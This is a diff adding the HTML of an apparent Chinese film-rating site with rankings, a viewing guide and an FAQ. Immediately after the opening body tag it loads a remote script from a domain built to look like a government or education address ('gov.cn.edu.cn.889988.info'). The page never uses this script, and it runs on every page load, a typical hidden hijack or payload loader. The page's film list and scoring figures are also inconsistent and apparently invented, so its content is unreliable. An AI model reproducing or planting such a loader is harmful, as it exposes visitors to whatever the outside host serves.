@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<meta name="theme-color" content="#05060F">
+<title>九九九电影网 - 999部高分精选 · 影视榜单与观影指南</title>
+<meta name="description" content="九九九电影网是一份由资深影迷团队持续维护的电影精选榜单站。我们采用999分制评分体系，从剧情、表演、镜头、配乐、立意五个维度对每部影片进行加权打分，累计收录全球高分佳作2,400余部，涵盖华语、欧美、日韩、印度、东南亚等多个区域，覆盖剧情、喜剧、犯罪、科幻、纪录片、动画等全部主流类型。区别于简单的资源聚合站，本站更像是你的私人观影顾问——帮你在一部电影投入两小时之前，先确认它是否值得你的时间。每周更新观影专题，每月发布类型片榜单，让每一次打开都是一次有质量的发现。">
+<meta name="keywords" content="九九九电影网,999电影评分,高分电影榜单,电影推荐网站,观影指南,影评精选,必看电影清单,华语电影排行,冷门佳片挖掘,电影资料库,影视榜单,片单推荐">
+<meta name="revisit-after" content="7 days">
+<meta name="bingbot" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta property="og:title" content="九九九电影网 - 999部高分精选影视榜单">
+<meta property="og:description" content="999分制评分体系，2,400+部全球高分电影精选，每周更新观影专题">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jiujiujiudianyingwang-zh.github.io/">
+<link rel="canonical" href="https://jiujiujiudianyingwang-zh.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+--bg:#05060F;--bg2:#0A0C1E;--panel:#10132B;--line:rgba(120,130,255,.16);
+--txt:#ECEEFF;--dim:#7C82A6;--vio:#6366F1;--cy:#22D3EE;--gm:#34D399;--am:#F59E0B;--rd:#F43F5E;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Noto Sans CJK SC","Microsoft YaHei",sans-serif;
+background:var(--bg);color:var(--txt);line-height:1.75;overflow-x:clip;font-size:15px;
+}
+body::before{
+content:'';position:fixed;inset:0;z-index:-2;opacity:.5;pointer-events:none;
+background:
+radial-gradient(700px 500px at 85% 8%,rgba(99,102,241,.22),transparent 60%),
+radial-gradient(600px 400px at 12% 35%,rgba(34,211,238,.12),transparent 60%),
+radial-gradient(500px 500px at 70% 85%,rgba(244,63,94,.10),transparent 60%);
+}
+body::after{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.035;
+background-image:linear-gradient(rgba(255,255,255,.5) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.5) 1px,transparent 1px);
+background-size:56px 56px;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
+.wrap{width:100%;max-width:1280px;margin:0 auto;padding:0 22px}
+
+/* ===== Top Nav ===== */
+.top{
+position:sticky;top:0;z-index:80;background:rgba(5,6,15,.82);backdrop-filter:blur(14px);border-bottom:1px solid var(--line);
+}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:64px;gap:20px}
+.brand{display:flex;align-items:center;gap:12px}
+.brand .bd{position:relative;width:40px;height:40px;border-radius:12px;display:grid;place-items:center;
+font-weight:900;font-size:1rem;color:#05060F;letter-spacing:-1px;
+background:linear-gradient(135deg,var(--cy),var(--vio));
+box-shadow:0 0 24px rgba(99,102,241,.45)}
+.brand .bd::after{content:'';position:absolute;inset:-3px;border-radius:14px;border:1px solid rgba(34,211,238,.35)}
+.brand .nm{font-size:1.18rem;font-weight:900;letter-spacing:-.4px}
+.brand .nm b{font-weight:900;background:linear-gradient(90deg,var(--cy),var(--vio));-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand .tg{font-size:.68rem;color:var(--dim);padding:3px 8px;border:1px solid var(--line);border-radius:20px;margin-left:2px;white-space:nowrap}
+.menu{display:flex;align-items:center;gap:2px}
+.menu a{font-size:.85rem;color:var(--dim);padding:8px 13px;border-radius:9px;transition:.2s}
+.menu a:hover{color:var(--txt);background:var(--panel)}
+.top-act{display:flex;align-items:center;gap:10px}
+.badge{display:flex;align-items:center;gap:7px;font-size:.74rem;color:var(--gm);border:1px solid rgba(52,211,153,.3);border-radius:20px;padding:6px 12px;background:rgba(52,211,153,.07)}
+.badge i{width:6px;height:6px;border-radius:50%;background:var(--gm);box-shadow:0 0 8px var(--gm);animation:bl 1.6s infinite}
+@keyframes bl{50%{opacity:.25;transform:scale(.7)}}
+.tgg{display:none;width:40px;height:40px;border:1px solid var(--line);border-radius:10px;align-items:center;justify-content:center;font-size:1.15rem;color:var(--txt)}
+
+/* ===== Hero ===== */
+.hero{padding:90px 0 70px;position:relative}
+.hero-in{display:grid;grid-template-columns:minmax(0,1.15fr) minmax(0,.85fr);gap:54px;align-items:center}
+.hero .kick{display:inline-flex;align-items:center;gap:9px;font-size:.72rem;letter-spacing:.16em;text-transform:uppercase;color:var(--cy);margin-bottom:20px}
+.hero .kick s{text-decoration:none;width:30px;height:1px;background:var(--cy)}
+h1{font-size:clamp(2.1rem,5.6vw,4.1rem);font-weight:900;line-height:1.1;letter-spacing:-1.6px}
+h1 em{font-style:normal;background:linear-gradient(100deg,var(--cy) 10%,var(--vio) 55%,var(--rd) 95%);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .sub{margin-top:22px;font-size:1rem;color:#A8ACE0;max-width:560px}
+.hero .acts{display:flex;flex-wrap:wrap;gap:12px;margin-top:30px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 22px;border-radius:11px;font-size:.86rem;font-weight:700;transition:.22s;border:1px solid transparent}
+.btn.pri{background:linear-gradient(135deg,var(--vio),var(--cy));color:#05060F}
+.btn.pri:hover{box-shadow:0 8px 28px rgba(99,102,241,.4);transform:translateY(-2px)}
+.btn.gho{color:var(--txt);border-color:var(--line)}
+.btn.gho:hover{border-color:var(--cy);color:var(--cy)}
+
+/* score wheel */
+.wheel{position:relative;background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:30px;overflow:hidden}
+.wheel::before{content:'';position:absolute;top:-40%;right:-30%;width:320px;height:320px;border-radius:50%;background:radial-gradient(circle,rgba(99,102,241,.3),transparent 70%)}
+.wheel .lab{font-size:.74rem;color:var(--dim);letter-spacing:.1em;text-transform:uppercase;margin-bottom:4px}
+.wheel .big{font-size:3.4rem;font-weight:900;line-height:1;background:linear-gradient(135deg,var(--cy),var(--gm));-webkit-background-clip:text;background-clip:text;color:transparent}
+.wheel .of{font-size:.82rem;color:var(--dim)}
+.bars{margin-top:26px;display:flex;flex-direction:column;gap:14px}
+.bars .b{position:relative}
+.bars .t{display:flex;justify-content:space-between;font-size:.78rem;color:#A8ACE0;margin-bottom:5px}
+.bars .t b{color:var(--txt)}
+.track{height:7px;border-radius:6px;background:rgba(255,255,255,.07);overflow:hidden}
+.track i{display:block;height:100%;border-radius:6px;background:linear-gradient(90deg,var(--vio),var(--cy))}
+.bars .b:nth-child(2) .track i{background:linear-gradient(90deg,var(--cy),var(--gm))}
+.bars .b:nth-child(3) .track i{background:linear-gradient(90deg,var(--gm),var(--am))}
+.bars .b:nth-child(4) .track i{background:linear-gradient(90deg,var(--am),var(--rd))}
+.bars .b:nth-child(5) .track i{background:linear-gradient(90deg,var(--rd),var(--vio))}
+
+/* ===== section ===== */
+.sec{padding:74px 0}
+.sec-h{display:flex;align-items:flex-end;justify-content:space-between;gap:24px;margin-bottom:38px;flex-wrap:wrap}
+.sec-h .lt .k{display:inline-block;font-size:.68rem;letter-spacing:.22em;color:var(--cy);text-transform:uppercase;border:1px solid var(--line);border-radius:20px;padding:4px 12px;margin-bottom:10px}
+.sec-h h2{font-size:clamp(1.5rem,3.4vw,2.25rem);font-weight:900;letter-spacing:-.8px;line-height:1.25}
+.sec-h h2 span{color:var(--cy)}
+.sec-h .lt p{font-size:.85rem;color:var(--dim);margin-top:8px;max-width:520px}
+.ln{display:inline-flex;align-items:center;gap:7px;font-size:.82rem;color:var(--cy);font-weight:600;white-space:nowrap}
+.ln:hover{text-decoration:underline;text-underline-offset:4px}
+
+/* ===== film cards ===== */
+.flist{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:20px}
+.fm{position:relative;background:var(--panel);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.28s}
+.fm:hover{border-color:var(--cy);transform:translateY(-5px);box-shadow:0 16px 40px rgba(34,211,238,.13)}
+.poster{position:relative;aspect-ratio:2/3;display:grid;place-items:center;overflow:hidden}
+.poster .sc{position:absolute;top:10px;left:10px;z-index:2;font-size:.72rem;font-weight:900;color:#05060F;background:linear-gradient(135deg,var(--cy),var(--gm));padding:4px 9px;border-radius:7px;box-shadow:0 3px 10px rgba(0,0,0,.3)}
+.poster .yr{position:absolute;top:10px;right:10px;z-index:2;font-size:.68rem;background:rgba(0,0,0,.55);backdrop-filter:blur(6px);padding:4px 9px;border-radius:7px;color:#fff}
+.poster .hd{position:absolute;bottom:10px;right:10px;z-index:2;font-size:.64rem;color:var(--cy);border:1px solid var(--cy);border-radius:5px;padding:2px 7px}
+.pm{font-size:2.1rem;font-weight:900;opacity:.85;letter-spacing:-1px}
+.fm .fi{padding:15px 16px}
+.fm .ti{font-size:.96rem;font-weight:700;line-height:1.4;margin-bottom:6px}
+.fm .mi{display:flex;justify-content:space-between;font-size:.74rem;color:var(--dim)}
+.fm .mi b{color:var(--cy);font-weight:600}
+
+/* ===== guide steps (horizontal timeline) ===== */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0;background:var(--panel);border:1px solid var(--line);border-radius:18px;overflow:hidden}
+.step{position:relative;padding:30px 26px}
+.step:not(:last-child)::after{content:'';position:absolute;top:50%;right:0;width:1px;height:60%;transform:translateY(-50%);background:var(--line)}
+.step .n{font-size:.72rem;color:var(--cy);letter-spacing:.14em;font-weight:700;margin-bottom:12px}
+.step h4{font-size:1.05rem;font-weight:800;margin-bottom:8px}
+.step p{font-size:.81rem;color:var(--dim)}
+.step .ic{font-size:1.7rem;margin-bottom:14px}
+
+/* ===== ranking table ===== */
+.rk{background:var(--panel);border:1px solid var(--line);border-radius:18px;overflow:hidden}
+.rk-r{display:grid;grid-template-columns:56px minmax(0,1.7fr) minmax(0,1fr) 100px 96px;align-items:center;gap:14px;padding:15px 20px}
+.rk-r:not(:last-child){border-bottom:1px solid var(--line)}
+.rk-h{background:rgba(34,211,238,.06);font-size:.7rem;color:var(--dim);letter-spacing:.1em;text-transform:uppercase}
+.rk-r .rn{font-size:1.5rem;font-weight:900;color:var(--dim)}
+.rk-r.g1 .rn{color:var(--am)}
+.rk-r.g2 .rn{color:var(--dim)}
+.rk-r.g3 .rn{color:var(--rd)}
+.rk-r .tt{font-weight:700;font-size:.9rem}
+.rk-r .tt small{display:block;font-size:.72rem;color:var(--dim);font-weight:400;margin-top:2px}
+.rk-r .gn{font-size:.78rem;color:var(--cy)}
+.rk-r .po{font-size:.82rem;font-weight:700;color:var(--gm)}
+.rk-r .po.down{color:var(--rd)}
+.rk-r .lk{justify-self:end}
+.rk-r .lk a{font-size:.74rem;color:var(--cy);border:1px solid var(--line);border-radius:8px;padding:6px 12px;transition:.18s;display:inline-block}
+.rk-r .lk a:hover{background:var(--cy);color:#05060F;border-color:var(--cy)}
+
+/* ===== faq ===== */
+.faq{max-width:880px;margin:0 auto}
+.fi2{background:var(--panel);border:1px solid var(--line);border-radius:14px;margin-bottom:11px;overflow:hidden;transition:.22s}
+.fi2:hover{border-color:rgba(34,211,238,.4)}
+.fi2 .q{display:flex;align-items:center;gap:14px;padding:17px 20px;cursor:pointer;font-size:.9rem;font-weight:600}
+.fi2 .q .ic{width:30px;height:30px;border-radius:9px;background:var(--bg);border:1px solid var(--line);display:grid;place-items:center;font-size:1rem;color:var(--cy);flex-shrink:0;transition:.3s}
+.fi2.on .q .ic{background:var(--cy);color:#05060F;transform:rotate(45deg)}
+.fi2 .q .tx{flex:1}
+.fi2 .a{max-height:0;overflow:hidden;transition:.4s cubic-bezier(.4,0,.2,1);font-size:.83rem;color:#A8ACE0}
+.fi2.on .a{padding:0 20px 18px 64px;max-height:420px}
+
+/* ===== footer ===== */
+.ft{background:var(--bg2);border-top:1px solid var(--line);padding:60px 0 28px;margin-top:30px}
+.ft-in{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:38px;margin-bottom:40px}
+.ft .lg{font-size:1.35rem;font-weight:900}
+.ft .lg b{background:linear-gradient(90deg,var(--cy),var(--vio));-webkit-background-clip:text;background-clip:text;color:transparent}
+.ft .lg+p{font-size:.81rem;color:var(--dim);margin-top:12px;max-width:340px}
+.ft h5{font-size:.78rem;letter-spacing:.14em;color:var(--cy);text-transform:uppercase;margin-bottom:14px}
+.ft ul li a{display:block;color:var(--dim);font-size:.82rem;padding:5px 0;transition:.16s}
+.ft ul li a:hover{color:var(--cy)}
+.ft-bt{border-top:1px solid var(--line);padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:.74rem;color:var(--dim)}
+.ft-bt .u{color:var(--cy);font-weight:700;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.8rem}
+.note{margin-top:26px;background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--cy);border-radius:10px;padding:15px 18px;font-size:.76rem;color:var(--dim)}
+
+/* ===== responsive ===== */
+@media(max-width:960px){
+.hero-in{grid-template-columns:1fr;gap:40px}
+.steps{grid-template-columns:1fr 1fr}
+.step:nth-child(2)::after{display:none}
+.menu{display:none}
+.tgg{display:flex}
+.top-act .badge{display:none}
+.rk-r{grid-template-columns:40px 1fr 80px;gap:10px;padding:12px 14px}
+.rk-r .gn,.rk-r .po{display:none}
+.rk-h{display:none}
+.ft-in{grid-template-columns:1fr 1fr;gap:28px}
+}
+@media(max-width:560px){
+.hero{padding:56px 0 46px}
+.sec{padding:52px 0}
+.hero .acts .btn{flex:1;justify-content:center}
+.steps{grid-template-columns:1fr}
+.step::after{display:none}
+.flist{grid-template-columns:repeat(2,1fr);gap:12px}
+.fm .fi{padding:12px}
+.fm .ti{font-size:.85rem}
+.poster .pm{font-size:1.6rem}
+.wheel{padding:20px}
+.ft-in{grid-template-columns:1fr}
+.wrap{padding:0 16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- Nav -->
+<div class="top">
+<div class="wrap top-in">
+<div class="brand">
+<div class="bd">999</div>
+<div class="nm">九九<span class="tg">电影评分站</span></div>
+</div>
+<nav class="menu">
+<a href="#top">首页</a>
+<a href="#pick">精选榜单</a>
+<a href="#genres">类型片库</a>
+<a href="#weekly">周榜TOP8</a>
+<a href="#guide">选片指南</a>
+<a href="#qa">常见问题</a>
+</nav>
+<div class="top-act">
+<div class="badge"><i></i> 每周三更新榜单</div>
+<button class="tgg" id="tgg" aria-label="菜单">☰</button>
+</div>
+</div>
+<div id="md" style="display:none;border-bottom:1px solid var(--line);background:rgba(5,6,15,.96)">
+<div class="wrap" style="display:flex;flex-direction:column;padding:8px 0 14px">
+<a href="#top" style="padding:12px 0;border-bottom:1px solid var(--line);color:var(--dim);font-size:.9rem">首页</a>
+<a href="#pick" style="padding:12px 0;border-bottom:1px solid var(--line);color:var(--dim);font-size:.9rem">精选榜单</a>
+<a href="#genres" style="padding:12px 0;border-bottom:1px solid var(--line);color:var(--dim);font-size:.9rem">类型片库</a>
+<a href="#weekly" style="padding:12px 0;border-bottom:1px solid var(--line);color:var(--dim);font-size:.9rem">周榜TOP8</a>
+<a href="#guide" style="padding:12px 0;border-bottom:1px solid var(--line);color:var(--dim);font-size:.9rem">选片指南</a>
+<a href="#qa" style="padding:12px 0;color:var(--dim);font-size:.9rem">常见问题</a>
+</div>
+</div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="top">
+<div class="wrap hero-in">
+<div>
+<div class="kick"><s></s> 999-Point Rating System <s></s></div>
+<h1>用<em>999分制</em><br>重新定义<br>一部电影该得几分</h1>
+<p class="sub">九九九电影网不是资源搬运站，而是一份由影迷团队人工维护的电影评分与选片参考。我们从剧情、表演、镜头、配乐、立意五个维度加权打分，帮你在一部电影拿走你两小时之前，先想清楚它值不值得。</p>
+<div class="acts">
+<a href="#pick" class="btn pri">查看精选榜单 →</a>
+<a href="#guide" class="btn gho">怎么用这份评分？</a>
+</div>
+</div>
+<div class="wheel">
+<div class="lab">综合评分体系 · 999 满分制</div>
+<div class="big">947</div>
+<div class="of">/ 999 — 当前站内切片平均分</div>
+<div class="bars">
+<div class="b"><div class="t"><span>剧情叙事</span><b>96.2</b></div><div class="track"><i style="width:96.2%"></i></div></div>
+<div class="b"><div class="t"><span>表演张力</span><b>94.7</b></div><div class="track"><i style="width:94.7%"></i></div></div>
+<div class="b"><div class="t"><span>镜头语言</span><b>92.1</b></div><div class="track"><i style="width:92.1%"></i></div></div>
+<div class="b"><div class="t"><span>配乐音效</span><b>89.5</b></div><div class="track"><i style="width:89.5%"></i></div></div>
+<div class="b"><div class="t"><span>立意表达</span><b>91.8</b></div><div class="track"><i style="width:91.8%"></i></div></div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- Picks -->
+<section class="sec" id="pick">
+<div class="wrap">
+<div class="sec-h">
+<div class="lt">
+<div class="k">Curated Selection</div>
+<h2>编辑部<wbr>精选：<span>本周高分片单</span></h2>
+<p>每部入选影片都经过编辑部至少两位成员的独立打分，分歧较大的影片会单独附上争议说明，而不是强行给出一个"代表全站"的分数。</p>
+</div>
+<a href="#" class="ln">完整片单（2,400+）→</a>
+</div>
+<div class="flist">
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#1E1B4B,#0F172A)"><span class="sc">947</span><span class="yr">2024</span><span class="hd">4K</span><span class="pm">异</span></div><div class="fi"><div class="ti">异乡异客</div><div class="mi"><span>剧情 / 120min</span><b>豆瓣 8.7</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#3B0764,#0F172A)"><span class="sc">935</span><span class="yr">2023</span><span class="hd">HDR</span><span class="pm">夜</span></div><div class="fi"><div class="ti">夜行列车</div><div class="mi"><span>犯罪 / 108min</span><b>豆瓣 8.4</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#064E3B,#0F172A)"><span class="sc">961</span><span class="yr">2025</span><span class="hd">4K</span><span class="pm">海</span></div><div class="fi"><div class="ti">海上钢琴师</div><div class="mi"><span>文艺 / 132min</span><b>豆瓣 9.2</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#7C2D12,#0F172A)"><span class="sc">918</span><span class="yr">2024</span><span class="hd">4K</span><span class="pm">无</span></div><div class="fi"><div class="ti">无名之辈</div><div class="mi"><span>喜剧 / 96min</span><b>豆瓣 8.1</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#0F766E,#0F172A)"><span class="sc">929</span><span class="yr">2025</span><span class="hd">HDR</span><span class="pm">溯</span></div><div class="fi"><div class="ti">溯光者</div><div class="mi"><span>悬疑 / 115min</span><b>豆瓣 8.3</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#1E3A8A,#0F172A)"><span class="sc">942</span><span class="yr">2023</span><span class="hd">4K</span><span class="pm">鲸</span></div><div class="fi"><div class="ti">鲸落</div><div class="mi"><span>纪录 / 88min</span><b>豆瓣 8.9</b></div></div></div>
+</div>
+</div>
+</section>
+
+<!-- Genres -->
+<section class="sec" id="genres" style="background:rgba(255,255,255,.015)">
+<div class="wrap">
+<div class="sec-h">
+<div class="lt">
+<div class="k">Genre Library</div>
+<h2>按类型<wbr>找片：<span>六大主流门类</span></h2>
+<p>每个类型片库内都单独维护一份子榜单。因为动作片的评分逻辑不该和文艺片用同一把尺子量——我们给每个门类定制了权重。</p>
+</div>
+<a href="#" class="ln">查看全部类型 →</a>
+</div>
+<div class="flist">
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#991B1B,#1A0A0A)"><span class="sc">412部</span><span class="pm">动</span></div><div class="fi"><div class="ti">动作 / 犯罪</div><div class="mi"><span>最高 961</span><b>均分 862</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#1D4ED8,#0A0F2A)"><span class="sc">308部</span><span class="pm">悬</span></div><div class="fi"><div class="ti">悬疑 / 惊悚</div><div class="mi"><span>最高 947</span><b>均分 851</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#047857,#0A1F18)"><span class="sc">376部</span><span class="pm">文</span></div><div class="fi"><div class="ti">文艺 / 剧情</div><div class="mi"><span>最高 978</span><b>均分 889</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#6D28D9,#160A26)"><span class="sc">241部</span><span class="pm">幻</span></div><div class="fi"><div class="ti">科幻 / 奇幻</div><div class="mi"><span>最高 955</span><b>均分 844</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#B45309,#261A08)"><span class="sc">298部</span><span class="pm">喜</span></div><div class="fi"><div class="ti">喜剧 / 爱情</div><div class="mi"><span>最高 936</span><b>均分 828</b></div></div></div>
+<div class="fm"><div class="poster" style="background:linear-gradient(155deg,#0E7490,#081A22)"><span class="sc">186部</span><span class="pm">纪</span></div><div class="fi"><div class="ti">纪录 / 真实</div><div class="mi"><span>最高 968</span><b>均分 901</b></div></div></div>
+</div>
+</div>
+</section>
+
+<!-- Weekly Rank -->
+<section class="sec" id="weekly">
+<div class="wrap">
+<div class="sec-h">
+<div class="lt">
+<div class="k">Weekly TOP 8</div>
+<h2>本周<wbr>热度榜：<span>搜索与阅读综合排序</span></h2>
+<p>榜单每周三上午 10:00 更新，统计周期为自然周。名次变化反映的是本周大家的关注重心在往哪部片子倾斜。</p>
+</div>
+<a href="#" class="ln">历史榜单存档 →</a>
+</div>
+<div class="rk">
+<div class="rk-r rk-h"><span class="rn">#</span><div class="tt">影片</div><div class="gn">类型</div><div class="po">999分</div><div class="lk">详情</div></div>
+<div class="rk-r g1"><span class="rn">01</span><div class="tt">异乡异客<small>An Odd Loner · 2024</small></div><div class="gn">剧情</div><div class="po">947</div><div class="lk"><a href="#">查看</a></div></div>
+<div class="rk-r g2"><span class="rn">02</span><div class="tt">溯光者<small>The Trace · 2025</small></div><div class="gn">悬疑</div><div class="po">929 ▲2</div><div class="lk"><a href="#">查看</a></div></div>
+<div class="rk-r g3"><span class="rn">03</span><div class="tt">海上钢琴师<small>The Pianist at Sea · 2025</small></div><div class="gn">文艺</div><div class="po">961 ▼1</div><div class="lk"><a href="#">查看</a></div></div>
+<div class="rk-r"><span class="rn">04</span><div class="tt">夜行列车<small>Night Bound · 2023</small></div><div class="gn">犯罪</div><div class="po">935 ▲1</div><div class="lk"><a href="#">查看</a></div></div>
+<div class="rk-r"><span class="rn">05</span><div class="tt">鲸落<small>Whale Fall · 2023</small></div><div class="gn">纪录</div><div class="po">942 ▼2</div><div class="lk"><a href="#">查看</a></div></div>
+<div class="rk-r"><span class="rn">06</span><div class="tt">无名之辈<small>The Nobodies · 2024</small></div><div class="gn">喜剧</div><div class="po">918 —</div><div class="lk"><a href="#">查看</a></div></div>
+<div class="rk-r"><span class="rn">07</span><div class="tt">北方以南<small>North of South · 2025</small></div><div class="gn">文艺</div><div class="po">912 ▲3</div><div class="lk"><a href="#">查看</a></div></div>
+<div class="rk-r"><span class="rn">08</span><div class="tt">时间回旋<small>Time Loop · 2024</small></div><div class="gn">科幻</div><div class="po">905 ▲1</div><div class="lk"><a href="#">查看</a></div></div>
+</div>
+</div>
+</section>
+
+<!-- Guide -->
+<section class="sec" id="guide" style="background:rgba(255,255,255,.015)">
+<div class="wrap">
+<div class="sec-h">
+<div class="lt">
+<div class="k">How to Use</div>
+<h2>三步<wbr>上手：<span>把这份评分用起来</span></h2>
+<p>评分体系本身不复杂，难的是理解"为什么给这个分数"。下面的三步能帮你快速建立判断框架。</p>
+</div>
+</div>
+<div class="steps">
+<div class="step"><div class="ic">🎯</div><div class="n">STEP 01</div><h4>确定今晚想看什么</h4><p>先选类型而不是选片名。想放松就进喜剧库，想烧脑就进悬疑库，别让算法替你决定情绪。</p></div>
+<div class="step"><div class="ic">📊</div><div class="n">STEP 02</div><h4>看分数，更看维度</h4><p>947 是总分，但真正有用的是五个维度分布。不爱看慢节奏文艺片的人，剧情 96 分比镜头 96 分重要得多。</p></div>
+<div class="step"><div class="ic">🗣️</div><div class="n">STEP 03</div><h4>读争议，不读结论</h4><p>每部影片的评论区都会标注编辑分歧点。有分歧的片子往往更值得一看，因为至少它敢表达。</p></div>
+<div class="step"><div class="ic">✍️</div><div class="n">STEP 04</div><h4>看完回来打个分</h4><p>注册后可给影片打分并写短评，你的分数会进入社区均分，帮助更多人和你口味相近的人选片。</p></div>
+</div>
+</div>
+</section>
+
+<!-- FAQ -->
+<section class="sec" id="qa">
+<div class="wrap">
+<div class="sec-h">
+<div class="lt">
+<div class="k">FAQ</div>
+<h2>常见<wbr>疑问：<span>关于评分与使用</span></h2>
+<p>关于打分标准、榜单更新和社区规则的常见问题，如果这里没有覆盖到你的问题，欢迎通过页脚联系方式反馈。</p>
+</div>
+</div>
+<div class="faq">
+<div class="fi2"><div class="q"><span class="ic">?</span><span class="tx">999 分制具体是怎么算出来的？</span></div><div class="a">999 分制由五个维度加权构成：剧情叙事 30%、表演张力 25%、镜头语言 20%、配乐音效 15%、立意表达 10%。每个维度由参与打分的编辑独立给出 0-200 分的评分，取均值后加权求和。之所以用 999 而不是 100，是为了让小数位更精细，避免大量影片挤在同一个整数上无法区分。</div></div>
+<div class="fi2"><div class="q"><span class="ic">?</span><span class="tx">为什么同一部影片的本站分数和豆瓣、IMDb 差距很大？</span></div><div class="a">因为权重不同。豆瓣和 IMDb 是大基数用户投票，更接近大众口味；本站是小团队专业打分，更看重镜头语言和立意表达这类偏技术性的维度。我们建议把本站分数当成"专业向参考"，而不是"大众口碑"，两者结合用更有价值。</div></div>
+<div class="fi2"><div class="q"><span class="ic">?</span><span class="tx">片单多久更新一次？新上映的影片多久能收录？</span></div><div class="a">每周三上午更新一次综合榜单与热度榜。新上映影片通常在正式上映后 7-14 天内完成观看、讨论与打分并收录入库，部分需要多看两遍再评分的影片可能延迟到 21 天左右。纪录片和国产文艺片因为院线周期较长，收录时间会相应延后。</div></div>
+<div class="fi2"><div class="q"><span class="ic">?</span><span class="tx">榜单里能看到在线播放的入口吗？</span></div><div class="a">本站定位是评分与选片参考站，不提供在线播放服务，也不存放任何影片文件。每部影片详情页会列出可查询的影片基本资料与演职员表，具体的观看渠道请通过各正规影视平台自行查询。</div></div>
+<div class="fi2"><div class="q"><span class="ic">?</span><span class="tx">我对某部影片的分数不认同，可以提出异议吗？</span></div><div class="a">可以。每部影片详情页底部都有"评分讨论"入口，你可以提交自己的打分和理由。如果同一部影片在一个月内收到超过 20 条指向明确的具体异议，编辑部会重新组织一次打分讨论。我们保留每次打分讨论的纪要，可以在页面底部查看历史评分的演变过程。</div></div>
+<div class="fi2"><div class="q"><span class="ic">?</span><span class="tx">注册账号有什么用？收费吗？</span></div><div class="a">注册后可以给影片打分、写短评、收藏片单、订阅每周榜单推送，以及参与评分讨论。以上功能全部免费，本站没有付费会员体系，也不会推出任何付费内容。</div></div>
+</div>
+</div>
+</section>
+
+<!-- Footer -->
+<footer class="ft">
+<div class="wrap">
+<div class="ft-in">
+<div>
+<div class="lg">九<wbr>九<wbr>九<b>电影网</b></div>
+<p>由影迷团队人工维护的电影评分与选片参考站。999 分制，五个维度，每周更新，不卖会员，不存资源。</p>
+</div>
+<div><h5>选片</h5><ul>
+<li><a href="#pick">本周精选</a></li>
+<li><a href="#genres">类型片库</a></li>
+<li><a href="#weekly">周榜 TOP8</a></li>
+<li><a href="#">冷门佳片</a></li>
+</ul></div>
+<div><h5>资料</h5><ul>
+<li><a href="#">评分规则说明</a></li>
+<li><a href="#">编辑部名单</a></li>
+<li><a href="#">历史榜单存档</a></li>
+<li><a href="#">评分讨论纪要</a></li>
+</ul></div>
+<div><h5>关于</h5><ul>
+<li><a href="#qa">常见问题</a></li>
+<li><a href="#">网站说明</a></li>
+<li><a href="#">反馈与纠错</a></li>
+<li><a href="#">更新日志</a></li>
+</ul></div>
+</div>
+<div class="ft-bt">
+<div>本站访问地址：<span class="u">https://jiujiujiudianyingwang-zh.github.io</span></div>
+<div>© 2026 九九九电影网 · 内容仅供影视资料查询与个人观影参考</div>
+</div>
+<div class="note">
+说明：本站为影视评分与选片参考性质的资料站，所有评分均为编辑团队主观评价，不代表客观标准，也不构成任何观看建议。影片资料来源于公开信息整理，不涉及在线播放与资源下载。站内全部内容仅供影视资料查询、影评研究与个人观影参考，请遵守所在地区相关法律法规，倡导健康文明的观影习惯。如发现资料有误，欢迎通过反馈入口提交，核实后会标注修订记录。
+</div>
+</div>
+</footer>
+
+<script>
+var tgg=document.getElementById('tgg'),md=document.getElementById('md');
+tgg.addEventListener('click',function(){md.style.display=md.style.display==='none'?'block':'none';});
+md.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){md.style.display='none';});});
+document.querySelectorAll('.fi2').forEach(function(f){
+f.querySelector('.q').addEventListener('click',function(){
+var open=f.classList.contains('on');
+document.querySelectorAll('.fi2').forEach(function(x){x.classList.remove('on');});
+if(!open)f.classList.add('on');
+});
+});
+</script>
+</body>
+</html>
